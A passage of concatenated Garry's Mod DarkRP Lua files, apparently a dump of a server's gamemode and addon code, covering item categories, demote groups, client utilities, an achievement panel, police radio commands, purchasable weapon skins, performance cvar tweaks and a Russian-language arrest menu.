        table.insert(gm.DarkRPGroupChats, function(ply) return table.HasValue(teams, ply:Team()) end)
    end
end
GM.AddGroupChat = function(_, ...) DarkRP.createGroupChat(...) end

DarkRP.removeGroupChat = fp{removeCustomItem, GM.DarkRPGroupChats, nil, "onGroupChatRemoved", false}

DarkRP.getGroupChats = fp{fn.Id, GM.DarkRPGroupChats}

GM.AmmoTypes = {}

function DarkRP.createAmmoType(ammoType, name, model, price, amountGiven, customCheck)
    local gm = GM or GAMEMODE
    gm.AmmoTypes = gm.AmmoTypes or {}
    local ammo = istable(name) and name or {
        name = name,
        model = model,
        price = price,
        amountGiven = amountGiven,
        customCheck = customCheck
    }
    ammo.ammoType = ammoType
    ammo.default = DarkRP.DARKRP_LOADING

    if DarkRP.DARKRP_LOADING and DarkRP.disabledDefaults["ammo"][ammo.name] then return end

    ammo.customCheck = ammo.customCheck and fp{DarkRP.simplerrRun, ammo.customCheck}
    ammo.CustomCheckFailMsg = isfunction(ammo.CustomCheckFailMsg) and fp{DarkRP.simplerrRun, ammo.CustomCheckFailMsg} or ammo.CustomCheckFailMsg
    ammo.id = table.insert(gm.AmmoTypes, ammo)

    DarkRP.addToCategory(ammo, "ammo", ammo.category)
end
GM.AddAmmoType = function(_, ...) DarkRP.createAmmoType(...) end

DarkRP.removeAmmoType = fp{removeCustomItem, GM.AmmoTypes, "ammo", "onAmmoTypeRemoved", true}

local demoteGroups = {}
function DarkRP.createDemoteGroup(name, tbl)
    if DarkRP.DARKRP_LOADING and DarkRP.disabledDefaults["demotegroups"][name] then return end
    if not tbl or not tbl[1] then error("No members in the demote group!") end

    local set = demoteGroups[tbl[1]] or disjoint.MakeSet(tbl[1])
    set.name = name
    for i = 2, #tbl do
        set = (demoteGroups[tbl[i]] or disjoint.MakeSet(tbl[i])) + set
        set.name = name
    end

    for _, teamNr in pairs(tbl) do
        if demoteGroups[teamNr] then
            -- Unify the sets if there was already one there
            demoteGroups[teamNr] = demoteGroups[teamNr] + set
        else
            demoteGroups[teamNr] = set
        end
    end
end

function DarkRP.removeDemoteGroup(name)
    local foundSet
    for k, v in pairs(demoteGroups) do
        local set = disjoint.FindSet(v)
        if set.name == name then
            foundSet = set
            demoteGroups[k] = nil
        end
    end
    hook.Run("onDemoteGroupRemoved", name, foundSet)
end

function DarkRP.getDemoteGroup(teamNr)
    demoteGroups[teamNr] = demoteGroups[teamNr] or disjoint.MakeSet(teamNr)
    return disjoint.FindSet(demoteGroups[teamNr])
end

DarkRP.getDemoteGroups = fp{fn.Id, demoteGroups}

local categories = {
    jobs = {},
    entities = {},
    shipments = {},
    weapons = {},
    vehicles = {},
    ammo = {},
}
local categoriesMerged = false -- whether categories and custom items are merged.

DarkRP.getCategories = fp{fn.Id, categories}

local categoryOrder = function(a, b)
    local aso = a.sortOrder or 100
    local bso = b.sortOrder or 100
    return aso < bso or aso == bso and a.name < b.name
end

local function insertCategory(destination, tbl)
    -- Override existing category of applicable
    for k, cat in pairs(destination) do
        if cat.name ~= tbl.name then continue end

        destination[k] = tbl
        tbl.members = cat.members
        return
    end

    table.insert(destination, tbl)
    local i = #destination

    while i > 1 do
        if categoryOrder(destination[i - 1], tbl) then break end
        destination[i - 1], destination[i] = destination[i], destination[i - 1]
        i = i - 1
    end
end

function DarkRP.createCategory(tbl)
    local valid, err, hints = DarkRP.validateCategory(tbl)
    if not valid then DarkRP.error(string.format("Corrupt category: %s!\n%s", tbl.name or "", err), 2, hints) end
    tbl.members = {}

    local destination = categories[tbl.categorises]
    insertCategory(destination, tbl)

    -- Too many people made the mistake of not creating a category for weapons as well as shipments
    -- when having shipments that can also be sold separately.
    if tbl.categorises == "shipments" then
        insertCategory(categories.weapons, table.Copy(tbl))
    end
end

function DarkRP.addToCategory(item, kind, cat)
    cat = cat or "Other"
    item.category = cat

    -- The merge process will take care of the category:
    if not categoriesMerged then return end

    -- Post-merge: manual insertion into category
    local cats = categories[kind]
    for _, c in ipairs(cats) do
        if c.name ~= cat then continue end

        insertCategory(c.members, item)
        return
    end

    DarkRP.errorNoHalt(string.format([[The category of "%s" ("%s") does not exist!]], item.name, cat), 2, {
        "Make sure the category is created with DarkRP.createCategory.",
        "The category name is case sensitive!",
        "Categories must be created before DarkRP finished loading.",
    })
end

function DarkRP.removeFromCategory(item, kind)
    local cats = categories[kind]
    if not cats then DarkRP.error(string.format("Invalid category kind '%s'.", kind), 2) end
    local cat = item.category
    if not cat then return end
    for _, v in pairs(cats) do
        if v.name ~= item.category then continue end
        for k, mem in pairs(v.members) do
            if mem ~= item then continue end
            table.remove(v.members, k)
            break
        end
        break
    end
end

-- Assign custom stuff to their categories
local function mergeCategories(customs, catKind, path)
    local cats = categories[catKind]
    local catByName = {}
    for _, v in pairs(cats) do catByName[v.name] = v end
    for _, v in pairs(customs) do
        -- Override default thing categories:
        local catName = v.default and (GAMEMODE.Config.CategoryOverride[catKind] or {})[v.name] or v.category or "Other"
        local cat = catByName[catName]
        if not cat then
            DarkRP.errorNoHalt(string.format([[The category of "%s" ("%s") does not exist!]], v.name, catName), 3, {
                "Make sure the category is created with DarkRP.createCategory.",
                "The category name is case sensitive!",
                "Categories must be created before DarkRP finished loading."
            }, path, -1, path)
            cat = catByName.Other
        end

        cat.members = cat.members or {}
        table.insert(cat.members, v)
    end

    -- Sort category members
    for _, v in pairs(cats) do table.sort(v.members, categoryOrder) end
end

hook.Add("loadCustomDarkRPItems", "mergeCategories", function()
    local shipments = fn.Filter(fc{fn.Not, fp{fn.GetValue, "noship"}}, CustomShipments)
    local guns = fn.Filter(fp{fn.GetValue, "separate"}, CustomShipments)

    mergeCategories(RPExtraTeams, "jobs", "your jobs")
    mergeCategories(DarkRPEntities, "entities", "your custom entities")
    mergeCategories(shipments, "shipments", "your custom shipments")
    mergeCategories(guns, "weapons", "your custom weapons")
    mergeCategories(CustomVehicles, "vehicles", "your custom vehicles")
    mergeCategories(GAMEMODE.AmmoTypes, "ammo", "your custom ammo")

    categoriesMerged = true
end)

--PATH gamemodes/darkrp/gamemode/modules/base/cl_util.lua:
local plyMeta = FindMetaTable("Player")

--[[---------------------------------------------------------------------------
Show a black screen
---------------------------------------------------------------------------
local function blackScreen(um)
    local toggle = um:ReadBool()
    if toggle then
        local black = Color(0, 0, 0)
        local w, h = ScrW(), ScrH()
        hook.Add("HUDPaintBackground", "BlackScreen", function()
            surface.SetDrawColor(black)
            surface.DrawRect(0, 0, w, h)
        end)
    else
        hook.Remove("HUDPaintBackground", "BlackScreen")
    end
end

usermessage.Hook("blackScreen", blackScreen) ]]

--[[---------------------------------------------------------------------------
Wrap strings to not become wider than the given amount of pixels
---------------------------------------------------------------------------]]
local function charWrap(text, pxWidth)
    local total = 0

    text = text:gsub(".", function(char)
        total = total + surface.GetTextSize(char)

        -- Wrap around when the max width is reached
        if total >= pxWidth then
            total = 0
            return "\n" .. char
        end

        return char
    end)

    return text, total
end

function DarkRP.textWrap(text, font, pxWidth)
    local total = 0

    surface.SetFont(font)

    local spaceSize = surface.GetTextSize(' ')
    text = text:gsub("(%s?[%S]+)", function(word)
            local char = string.sub(word, 1, 1)
            if char == "\n" or char == "\t" then
                total = 0
            end

            local wordlen = surface.GetTextSize(word)
            total = total + wordlen

            -- Wrap around when the max width is reached
            if wordlen >= pxWidth then -- Split the word if the word is too big
                local splitWord, splitPoint = charWrap(word, pxWidth - (total - wordlen))
                total = splitPoint
                return splitWord
            elseif total < pxWidth then
                return word
            end

            -- Split before the word
            if char == ' ' then
                total = wordlen - spaceSize
                return '\n' .. string.sub(word, 2)
            end

            total = wordlen
            return '\n' .. word
        end)

    return text
end

--[[---------------------------------------------------------------------------
Decides whether a given player is in the same room as the local player
note: uses a heuristic
---------------------------------------------------------------------------]]
function plyMeta:isInRoom()
    local tracedata = {}
    tracedata.start = LocalPlayer():GetShootPos()
    tracedata.endpos = self:GetShootPos()
    local trace = util.TraceLine(tracedata)

    return not trace.HitWorld
end

--[[---------------------------------------------------------------------------
Key name to key int mapping
---------------------------------------------------------------------------]]
local keyNames
function input.KeyNameToNumber(str)
    if not keyNames then
        keyNames = {}
        for i = 1, 107, 1 do
            keyNames[input.GetKeyName(i)] = i
        end
    end

    return keyNames[str]
end

--PATH gamemodes/darkrp/gamemode/modules/base/cl_gamemode_functions.lua:
local GUIToggled = false
local mouseX, mouseY = ScrW() / 2, ScrH() / 2
function GM:ShowSpare1()
    local jobTable = LocalPlayer():getJobTable()

    if jobTable.ShowSpare1 then
        return jobTable.ShowSpare1(LocalPlayer())
    end

    GUIToggled = not GUIToggled

    if GUIToggled then
        gui.SetMousePos(mouseX, mouseY)
    else
        mouseX, mouseY = gui.MousePos()
    end
    gui.EnableScreenClicker(GUIToggled)
end

function GM:ShowSpare2()
    local jobTable = LocalPlayer():getJobTable()

    if jobTable.ShowSpare2 then
        return jobTable.ShowSpare2(LocalPlayer())
    end

    DarkRP.toggleF4Menu()
end

function GM:PlayerStartVoice(ply)
    if ply == LocalPlayer() then
        ply.DRPIsTalking = true
        return -- Not the original rectangle for yourself! ugh!
    end
    self.Sandbox.PlayerStartVoice(self, ply)
end

function GM:PlayerEndVoice(ply)
    if ply == LocalPlayer() then
        ply.DRPIsTalking = false
        return
    end

    self.Sandbox.PlayerEndVoice(self, ply)
end

function GM:OnPlayerChat()
end

local FKeyBinds = {
    ["gm_showhelp"] = "ShowHelp",
    ["gm_showteam"] = "ShowTeam",
    ["gm_showspare1"] = "ShowSpare1",
    ["gm_showspare2"] = "ShowSpare2"
}

function GM:PlayerBindPress(ply, bind, pressed)
    self.Sandbox.PlayerBindPress(self, ply, bind, pressed)

    local bnd = string.match(string.lower(bind), "gm_[a-z]+[12]?")
    if bnd and FKeyBinds[bnd] then
        hook.Call(FKeyBinds[bnd], GAMEMODE)
    end

    if not self.Config.deadvoice and not ply:Alive() and string.find(string.lower(bind), "voicerecord") then return true end
end

function GM:InitPostEntity()
    hook.Call("teamChanged", GAMEMODE, GAMEMODE.DefaultTeam, GAMEMODE.DefaultTeam)
end

function GM:teamChanged(before, after)
end

local function OnChangedTeam()
    local oldTeam, newTeam = net.ReadInt(8), net.ReadInt(8)
    hook.Call("teamChanged", GAMEMODE, oldTeam, newTeam) -- backwards compatibility
    hook.Call("OnPlayerChangedTeam", GAMEMODE, LocalPlayer(), oldTeam, newTeam)
end
net.Receive("OnChangedTeam", OnChangedTeam)

timer.Simple(0, function() GAMEMODE.ShowTeam = DarkRP.openKeysMenu end)

--PATH gamemodes/darkrp/gamemode/modules/base/cl_drawshit.lua:
local color_bg = Color(0, 0, 0)
local color_outline = Color(245, 245, 245)
local math_clamp = math.Clamp
local Color = Color

function DrawProgress(x, y, w, h, perc)
	local color = Color(255 - (perc * 255), perc * 255, 0, 255)
	draw.OutlinedBox(x, y, w, h, color_bg, color_outline)
	draw.OutlinedBox(x + 5, y + 5, math_clamp((w * perc) - 10, 3, w), h - 10, color, color_outline)
end
--PATH addons/111mod/lua/darkrp_modules/rp_achievement/cl_achievement.lua:
local blur = Material('pp/blurscreen')

function framework(panel, amount)
    local x, y = panel:LocalToScreen(0, 0)
    local scrW, scrH = ScrW(), ScrH()
    surface.SetDrawColor(255, 255, 255)
    surface.SetMaterial(blur)

    for i = 1, 3 do
        blur:SetFloat('$blur', (i / 3) * (amount or 6))
        blur:Recompute()
        render.UpdateScreenEffectTexture()
        surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
    end
end

function frametext(text, font, x, y, color, x_a, y_a, color_shadow)
    color_shadow = color_shadow or Color(0, 0, 0)
    draw.SimpleText(text, font, x + 1, y + 1, color_shadow, x_a, y_a)
    local w, h = draw.SimpleText(text, font, x, y, color, x_a, y_a)

    return w, h
end

surface.CreateFont('travka.btn', {
    font = 'PT Root UI Bold',
    size = ScreenScale(8),
	antialias = true,
    extended = true
})

surface.CreateFont('travka.small', {
    font = 'PT Root UI Medium',
    size = ScreenScale(6),
	antialias = true,
    extended = true
})

function achsys(tabs)
    local dframe = ui.Create('ui_panel')
    dframe:SetSize(tabs:GetParent():GetWide() - ScrW() * 0.1285, tabs:GetParent():GetTall())
    local Scroll = vgui.Create('DScrollPanel', dframe)
    Scroll:Dock(FILL)
    Scroll:DockMargin(0, 3, 0, 0)

    Scroll.Paint = function(self, w, h)
        --draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 100))
    end

    Scroll.VBar:SetWide(3)
    Scroll:DockMargin(0, 0, 0, 0)
    local bar = Scroll.VBar
    bar:SetHideButtons(true)
    bar.Paint = function(this, w, h) end
    bar.btnUp.Paint = function(this, w, h) end
    bar.btnDown.Paint = function(this, w, h) end

    for k, v in pairs(ash) do
        local credits = Scroll:Add('DPanel')
        credits:Dock(TOP)
        credits:SetTall(ScrH() * 0.0595)
        credits:DockMargin(5, 2.5, 5, 0)
        credits:SetText('')

        credits.Paint = function(this, w, h)
            draw.RoundedBox(8, 0, 0, w, h, Color(61, 61, 61))
			local ow = w * 0.075
            frametext(v.n, 'travka.btn', ow, h * .02, v.color, 0, 0)
            frametext(v.d, 'travka.btn', ow, h * .5, Color(255, 255, 255), 0, 1)

			local oh = h * .98
            if LocalPlayer():GetNW2Bool(v.b) then
                frametext('Выполнил', 'travka.small', ow, oh, Color(0, 255, 0), 0, 4)
            else
                frametext('Не выполнил', 'travka.small', ow, oh, Color(255, 0, 0), 0, 4)
            end
        end

        if not LocalPlayer():GetNW2Bool(v.b) then
            local join = vgui.Create('DButton', credits)
            join:SetText('')
            join:Dock(RIGHT)
            join:SetWide(ScrW() * 0.0652)
            join:DockMargin(0, 20, 7, 20)

            join.DoClick = function()
                credits:Remove()
            end

            join.Paint = function(this, w, h)
                if (this.Depressed or this.m_bSelected) then
                    draw.RoundedBox(8, 0, 0, w, h, Color(101, 101, 101))
                elseif (this.Hovered) then
                    draw.RoundedBox(8, 0, 0, w, h, Color(111, 111, 111))
                else
                    draw.RoundedBox(8, 0, 0, w, h, Color(91, 91, 91))
                end

                draw.SimpleText('Выполнить', 'travka.btn', w * .5, 0, Color(255, 255, 255), 1, 0)
            end

            join.DoClick = function()
                net.Start('checkach')
                net.WriteInt(v.id, 32)
                net.SendToServer()
            end
        end

        if v.mdl ~= nil then
            local mpanel = vgui.Create('DPanel', credits)
            mpanel:SetSize(credits:GetTall(), credits:GetTall())
            mpanel:SetPos(0, 0)

            mpanel.Paint = function(self, w, h)
                draw.RoundedBox(8, 0, 0, w, h, Color(29, 29, 29))
            end

            local model = vgui.Create('DModelPanel', mpanel)
            model:SetPos(0, 0)
            model:SetSize(credits:GetTall(), credits:GetTall())
            model:SetModel(v.mdl)
            local min, max = model.Entity:GetRenderBounds()
            model:SetCamPos(min:Distance(max) * Vector(0.5, 0.5, 0.2))
            model:SetLookAt((max + min) * .5)
        end
    end

    return dframe
end
--PATH addons/111mod/lua/darkrp_modules/police_radio/sh_p_radio.lua:
DarkRP.registerDarkRPVar("Police_Radio_Enabled",net.WriteBool,net.ReadBool)
DarkRP.registerDarkRPVar("Police_Radio_CanHear",net.WriteBool,net.ReadBool)

DarkRP.declareChatCommand{
	command = "giveradio",
	description = "Grant a player the ability to use their police radio.",
	delay = 1.5,
	condition = function(ply) if Police_Radio_Config["Require_Admin_Approval"] and ply:IsAdmin() then return true end end
}

DarkRP.declareChatCommand{
	command = "removeradio",
	description = "Remove a player's ability to use their police radio.",
	delay = 1.5,
	condition = function(ply) if Police_Radio_Config["Require_Admin_Approval"] and ply:IsAdmin() then return true end end
}


--Some people don't pay enough attention, and if they are still using the old variable config, we need to remind them not to
if Police_Radio_Config["HUD_Vehicle_Text_Off"] or Police_Radio_Config["Only_If_On"] then
	timer.Create("police_radio_changeyourconfigdamnit",90,0,function()
		print("[POLICE-RADIO]: The HUD_Vehicle_Text_Off and Only_If_On variables are no longer used, and should be removed from the config file.")
	end)
end
--PATH addons/111mod/lua/darkrp_modules/menu/sh_weapon.lua:
local WeaponMaterials = {
	['models/props_wasteland/quarryobjects01'] = 300,
	['phoenix_storms/metalset_1-2'] = 800,
	['models/XQM/SquaredMat'] = 800,
	['models/props_animated_breakable/smokestack/brickwall002a'] = 800,
	['models/props_combine/combine_monitorbay_disp'] = 800,
	['models/props_combine/metal_combinebridge001'] = 800,
	['models/props_debris/concretefloor020a'] = 800,
	['models/XQM/BoxFull_diffuse'] = 800,
	['phoenix_storms/Fender_chrome'] = 800,
	['models/dav0r/hoverball'] = 1000,
	['phoenix_storms/Future_vents'] = 1000,
	['phoenix_storms/car_tire'] = 1000,
	['phoenix_storms/white_fps'] = 1000,
	['phoenix_storms/cigar'] = 1000,
	['phoenix_storms/wire/pcb_blue'] = 1000,
	['models/shadertest/shader5'] = 1000,
	['models/shiny'] = 1000,
	['models/player/player_chrome1'] = 1000,
	['models/props_combine/prtl_sky_sheet'] = 1000,
	['phoenix_storms/FuturisticTrackRamp_1-2'] = 1000,
	['phoenix_storms/checkers_map'] = 1000,
	['models/combine_advisor/mask'] = 1000,
	['models/weapons/v_crossbow/rebar_glow'] = 1000,
	['phoenix_storms/t_light'] = 1000,
	['models/XQM/CellShadedCamo_diffuse'] = 1200,
	['phoenix_storms/stripes'] = 1200,
	['models/XQM/SquaredMatInverted'] = 1200,
	['models/effects/splode_sheet'] = 1200,
	['models/flesh'] = 1200,
	['models/props/cs_assault/moneytop'] = 1350,
	['phoenix_storms/heli'] = 1500,
}

if (SERVER) then
	util.AddNetworkString 'cosmetrics.WeaponSkin'
	concommand.Add("weaponmaterial", function(pl, cmd, args)
		if not WeaponMaterials[args[1]] then return end
		if pl:canAfford(WeaponMaterials[args[1]]) then
			pl:addMoney(-WeaponMaterials[args[1]])
			net.Start('cosmetrics.WeaponSkin')
				net.WriteEntity( pl:GetActiveWeapon() )
				net.WriteString( args[1] )
			net.Send( pl )
			DarkRP.notify( pl, 1, 5, "Вы успешно купили скин!")
		end
	end)
else
	local WeaponMaterialCache = WeaponMaterialCache or {}

	net('cosmetrics.WeaponSkin', function()
		WeaponMaterialCache[net.ReadEntity()] = net.ReadString()
	end)

	
		hook('PreDrawViewModel', 'weaponskins.PreDrawViewModel', function(vm, pl, wep)
		if IsValid(vm) and IsValid(wep) and (wep == pl:GetActiveWeapon()) --[[and (string.sub(wep:GetClass(), 0, 3) ~= 'swb' or string.sub(wep:GetClass(), 0, 3) ~= 'm9k')]] then
			local mat = WeaponMaterialCache[wep]
			if not mat then return end
			
			wep.CosmeticsViewModelIndex = vm:ViewModelIndex()

			for k, v in pairs(vm:GetMaterials()) do
				if not string.find(v, 'hands') then
					vm:SetSubMaterial(k - 1, mat)
				else
					vm:SetSubMaterial(k - 1)
				end
			end
		end
	end)

	local function reset(wep)
		if (not IsValid(LocalPlayer())) then return end

		local vm = LocalPlayer():GetViewModel(wep.CosmeticsViewModelIndex)

		if (not IsValid(vm)) then return end

		for k, v in pairs(vm:GetMaterials()) do
			vm:SetSubMaterial(k - 1)
		end
	end

	hook('PlayerSwitchWeapon', 'weaponskins.PlayerSwitchWeapon', function(pl, oldWep, newWep)
		if IsValid(oldWep) and oldWep.CosmeticsViewModelIndex then
			reset(oldWep)
		end
	end)

	hook('EntityRemoved', 'weaponskins.EntityRemoved', function(ent)
		if WeaponMaterialCache[ent] then
			reset(ent)

			WeaponMaterialCache[ent] = nil
		end
	end)
end
--PATH addons/111mod/lua/darkrp_modules/gmb_fix/cl_init_opt.lua:
local cmdlist = {
	--r_shadows = { 0, GetConVarNumber },
	r_shadowrendertotexture = { 0, GetConVarNumber },
	r_shadowmaxrendered = { 0, GetConVarNumber },
	r_WaterDrawReflection = { 1, GetConVarNumber },
	r_WaterDrawRefraction  = { 1, GetConVarNumber },
	r_3dsky = { 0, GetConVarNumber },
	mat_shadowstate = { 0, GetConVarNumber },
	cl_phys_props_enable = { 0, GetConVarNumber },
	cl_phys_props_max = { 0, GetConVarNumber },
	props_break_max_pieces = { 0, GetConVarNumber },
	r_propsmaxdist = { 0, GetConVarNumber },

	r_drawmodeldecals = { 0, GetConVarNumber },
	cl_threaded_bone_setup = { 1, GetConVarNumber },
	cl_threaded_client_leaf_system = { 1, GetConVarNumber },
	r_threaded_client_shadow_manager = { 1, GetConVarNumber },
	r_threaded_particles = { 1, GetConVarNumber },
	r_threaded_renderables = { 1, GetConVarNumber },
	r_queued_ropes = { 1, GetConVarNumber },
	studio_queue_mode = { 1, GetConVarNumber },
	mat_queue_mode = { 2, GetConVarNumber },
	gmod_mcore_test = { 1, GetConVarNumber },
}

local detours = {}

for k,v in pairs( cmdlist ) do
	detours[k] = v[2](k)
	RunConsoleCommand(k, v[1])
end

hook.Add( "ShutDown", "rp.workarounds.cvars.shutDown", function()
	for k,v in pairs(detours) do
		RunConsoleCommand(k,v)
	end
end)

GM = GM or GAMEMODE

function GM:ChatText(index, name, text, typ)
	if typ == "joinleave" then return true end
    if typ == "namechange" then return true end

	return false
end

--PATH addons/111mod/lua/darkrp_modules/arrestmenu/cl_init.lua:
local BORDER = ScreenScale(1)

local OFFSET = BORDER * 8

local mat_grad = Material( "gui/gradient_up" )

local function enc_h(px)
	return math.Round(px * ScrH() / 1080)
end

surface.CreateFont('MB_30',{
	font = "Montserrat Bold",
	size = enc_h(30),
	weight = 500,
	extended = true,
})
surface.CreateFont('MB_25',{
	font = "Montserrat Bold",
	size = enc_h(25),
	weight = 500,
	extended = true,
})
surface.CreateFont('MB_20',{
	font = "Montserrat Bold",
	size = enc_h(20),
	weight = 500,
	extended = true,
})
surface.CreateFont('M_20',{
	font = "Montserrat",
	size = enc_h(20),
	weight = 500,
	extended = true,
})
function DarkRP.openArrestMenu(ply)
	local arrestMenu = vgui.Create("DPanel")
	arrestMenu:SetSize(ScreenScale(175),ScreenScale(125))
	arrestMenu:Center()
	function arrestMenu:Paint(w,h)
		draw.RoundedBox(BORDER * 8,0,0,w,h,Color( 0, 117, 223))
		draw.RoundedBox(BORDER * 7,BORDER,BORDER,w - BORDER * 2,h - BORDER * 2,Color( 38, 38, 38))
	end

	function arrestMenu:Think()
		if not ply:Alive() or not LocalPlayer():Alive() then
			self:Remove()
		end

		local dist = LocalPlayer():GetPos():DistToSqr(ply:GetPos())

		if dist > DarkRP.arrestDistance * DarkRP.arrestDistance then
			self:Remove()
		end
	end

	function arrestMenu:OnRemove()
		gui.EnableScreenClicker(false)
	end

	gui.EnableScreenClicker(true)

	timer.Simple(DarkRP.arrestMenuDelay,function()
		if IsValid(arrestMenu) then
			arrestMenu:Remove()
		end
	end)

	local closeButton = arrestMenu:Add("DButton")
	closeButton:SetText("❌")
	closeButton:SetFont("M_20")
	closeButton:SetSize(ScreenScale(14),ScreenScale(10))
	closeButton:SetPos(arrestMenu:GetWide() - closeButton:GetWide() - OFFSET,OFFSET)
	closeButton:SetTextColor(color_white)
	function closeButton:Paint(w,h)
		draw.RoundedBox(BORDER * 2,0,0,w,h,self:IsHovered() and Color( 230, 52, 52) or Color( 198, 28, 28))
	end
	
	function closeButton:DoClick()
		arrestMenu:Remove()
	end

	local mainLabel = arrestMenu:Add("DLabel")
	mainLabel:SetText("Арестовать человека")
	mainLabel:SetFont("MB_30")
	mainLabel:SizeToContents()
	mainLabel:SetColor(color_white)
	mainLabel:SetPos(OFFSET,OFFSET)
	
	local avatar = arrestMenu:Add( "DPanel")
	avatar:SetSize( ScreenScale(32) , ScreenScale(32) )
	avatar:SetPos( OFFSET, ScreenScale(25) )
	function avatar:Paint(w,h)
		draw.RoundedBox(BORDER * 4,0,0,w,h,Color( 25, 25, 25))
	end

	local mdl = avatar:Add("DModelPanel")
	mdl:Dock(FILL)
	mdl:SetModel( ply:GetModel() )
	function mdl:LayoutEntity() return end

	local headpos = ( mdl.Entity:LookupBone("ValveBiped.Bip01_Head1") ) and mdl.Entity:GetBonePosition(mdl.Entity:LookupBone("ValveBiped.Bip01_Head1")) or mdl.Entity:WorldSpaceCenter()
	mdl:SetLookAt(headpos)
	mdl:SetCamPos(headpos-Vector(-18, 0, 0))
	mdl.Entity:SetEyeTarget(Vector(-1,0,0))

	local nameLabel = arrestMenu:Add("DLabel")
	nameLabel:SetText("Имя: ")
	nameLabel:SetFont("MB_20")
	nameLabel:SizeToContents()
	nameLabel:SetColor(Color(155,155,155))
	nameLabel:SetPos(avatar:GetX() + avatar:GetWide() + OFFSET,avatar:GetY() + ScreenScale(2))
	
	local nickLabel = arrestMenu:Add("DLabel")
	nickLabel:SetText(ply:Nick())
	nickLabel:SetFont("MB_25")
	nickLabel:SizeToContents()
	nickLabel:SetColor(color_white)
	nickLabel:SetPos(nameLabel:GetX() + nameLabel:GetWide() + ScreenScale(1),nameLabel:GetY() + nameLabel:GetTall() - nickLabel:GetTall())
	
	local steamLabel = arrestMenu:Add("DLabel")
	steamLabel:SetText("Лицензия на оружие: ")
	steamLabel:SetFont("MB_20")
	steamLabel:SizeToContents()
	steamLabel:SetColor(Color(155,155,155))
	steamLabel:SetPos(avatar:GetX() + avatar:GetWide() + OFFSET,avatar:GetY() + ScreenScale(12))
	
	local steamIdLabel = arrestMenu:Add("DLabel")
	steamIdLabel:SetText((ply:HasWeapon("fakepass") and ply:GetNW2Bool("fakeGunLicense") or ply:getDarkRPVar("HasGunlicense")) and "Есть" or "Отсутствует")
	steamIdLabel:SetFont("MB_25")
	steamIdLabel:SizeToContents()
	steamIdLabel:SetColor(color_white)
	steamIdLabel:SetPos(steamLabel:GetX() + steamLabel:GetWide() + ScreenScale(1),steamLabel:GetY() + steamLabel:GetTall() - steamIdLabel:GetTall())

	local statusLabel = arrestMenu:Add("DLabel")
	statusLabel:SetText("Статус: ")
	statusLabel:SetFont("MB_20")
	statusLabel:SizeToContents()
	statusLabel:SetColor(Color(155,155,155))
	statusLabel:SetPos(avatar:GetX() + avatar:GetWide() + OFFSET,avatar:GetY() + ScreenScale(22))
	
	local wantedLabel = arrestMenu:Add("DLabel")
	wantedLabel:SetText(ply:HasWeapon("fakepass") and "Не разыскивается" or (ply:isWanted() and "В розыске" or "Не разыскивается"))
	wantedLabel:SetFont("MB_25")
	wantedLabel:SizeToContents()
	wantedLabel:SetColor(color_white)
	wantedLabel:SetPos(statusLabel:GetX() + statusLabel:GetWide() + ScreenScale(1),statusLabel:GetY() + statusLabel:GetTall() - wantedLabel:GetTall())
	
	local selectedLevel

	local levelLabel = arrestMenu:Add("DLabel")
	levelLabel:SetText("Степень тяжести")
	levelLabel:SetFont("MB_20")
	levelLabel:SizeToContents()
	levelLabel:SetColor(Color(200,200,200))
	levelLabel:SetPos(OFFSET,ScreenScale(62))

	local lowArrest = arrestMenu:Add("DButton")
	lowArrest:SetText("")
	lowArrest:SetSize(ScreenScale(50),ScreenScale(20))
	lowArrest:SetPos(OFFSET,ScreenScale(73))
	lowArrest:SetTextColor(color_white)
	function lowArrest:Paint(w,h)
		if selectedLevel == 0 then
			draw.RoundedBox(BORDER * 4,0,0,w,h,Color( 0, 117, 223))
			draw.RoundedBox(BORDER * 3,BORDER * 0.5,BORDER * 0.5,w - BORDER,h - BORDER,self:IsHovered() and Color( 50, 50, 50) or Color( 25, 25, 25))

			surface.SetMaterial(mat_grad)
			surface.SetDrawColor(0, 117, 223,25)
			surface.DrawTexturedRect(0,h * 0.5,w,h * 0.5)
		else
			draw.RoundedBox(BORDER * 4,0,0,w,h,self:IsHovered() and Color( 50, 50, 50) or Color( 25, 25, 25))
		end

		draw.SimpleText("Лёгкая","MB_20",w * 0.5, h * 0.5,Color(200,200,200),TEXT_ALIGN_CENTER,TEXT_ALIGN_BOTTOM)
		draw.SimpleText(tostring(DarkRP.arrestDuration[0]).." секунд","M_20",w * 0.5, h * 0.5 + ScreenScale(1),Color(165,165,165),TEXT_ALIGN_CENTER,TEXT_ALIGN_TOP)
	end
	
	local midArrest = arrestMenu:Add("DButton")
	midArrest:SetText("")
	midArrest:SetSize(ScreenScale(50),ScreenScale(20))
	midArrest:SetPos(arrestMenu:GetWide() * 0.5 - midArrest:GetWide() * 0.5,ScreenScale(73))
	midArrest:SetTextColor(color_white)
	function midArrest:Paint(w,h)
		if selectedLevel == 1 then
			draw.RoundedBox(BORDER * 4,0,0,w,h,Color( 0, 117, 223))
			draw.RoundedBox(BORDER * 3,BORDER * 0.5,BORDER * 0.5,w - BORDER,h - BORDER,self:IsHovered() and Color( 50, 50, 50) or Color( 25, 25, 25))

			surface.SetMaterial(mat_grad)
			surface.SetDrawColor(0, 117, 223,25)
			surface.DrawTexturedRect(0,h * 0.5,w,h * 0.5)
		else
			draw.RoundedBox(BORDER * 4,0,0,w,h,self:IsHovered() and Color( 50, 50, 50) or Color( 25, 25, 25))
		end

		draw.SimpleText("Средняя","MB_20",w * 0.5, h * 0.5,Color(200,200,200),TEXT_ALIGN_CENTER,TEXT_ALIGN_BOTTOM)
		draw.SimpleText(tostring(DarkRP.arrestDuration[1]).." секунд","M_20",w * 0.5, h * 0.5 + ScreenScale(1),Color(165,165,165),TEXT_ALIGN_CENTER,TEXT_ALIGN_TOP)
	end

	local highArrest = arrestMenu:Add("DButton")
	highArrest:SetText("")
	highArrest:SetSize(ScreenScale(50),ScreenScale(20))
	highArrest:SetPos(arrestMenu:GetWide() - highArrest:GetWide() - OFFSET,ScreenScale(73))
	highArrest:SetTextColor(color_white)
	function highArrest:Paint(w,h)
		if selectedLevel == 2 then
			draw.RoundedBox(BORDER * 4,0,0,w,h,Color( 0, 117, 223))
			draw.RoundedBox(BORDER * 3,BORDER * 0.5,BORDER * 0.5,w - BORDER,h - BORDER,self:IsHovered() and Color( 50, 50, 50) or Color( 25, 25, 25))

			surface.SetMaterial(mat_grad)
			surface.SetDrawColor(0, 117, 223,25)
			surface.DrawTexturedRect(0,h * 0.5,w,h * 0.5)
		else
